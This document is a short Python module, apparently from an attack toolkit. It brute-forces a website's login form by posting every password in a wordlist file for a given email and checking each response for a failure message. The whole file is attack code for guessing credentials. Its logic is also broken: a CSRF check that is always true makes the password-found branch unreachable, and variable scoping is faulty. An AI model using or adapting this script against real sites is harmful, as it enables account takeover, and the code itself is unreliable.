import requests

isVulnerable = False
message = ""

def crack(url, username, error_message, passwords):
    print("Hello world")
    count = 0
    for password in passwords:
        password = password.strip()
        count = count + 1
        data_dict = {"email": username,"password": password, "Log In":"submit"}
        response = requests.post(url, data=data_dict)
        print(response)
        if error_message in str(response.content):
            isVulnerable = True
            pass
        elif "CSRF" or "csrf" in str(response.content):
            isVulnerable = False
            message = "BruteForce not working on this website. CSRF Token Detecked."
            return isVulnerable, message
        else:
            isVulnerable = True
            message = "Password: " + password
            return isVulnerable, message
        
    
    message = "User password not in list of passwords"
    return isVulnerable, message

def bruteForceAttack(url, username, errorMessage):
    url = url
    username = username

    try:
        with open("attack_modules/brute_force/passwords.txt", "r") as passwords:
            return crack(url, username, errorMessage, passwords)
    except:
        return True, "Error"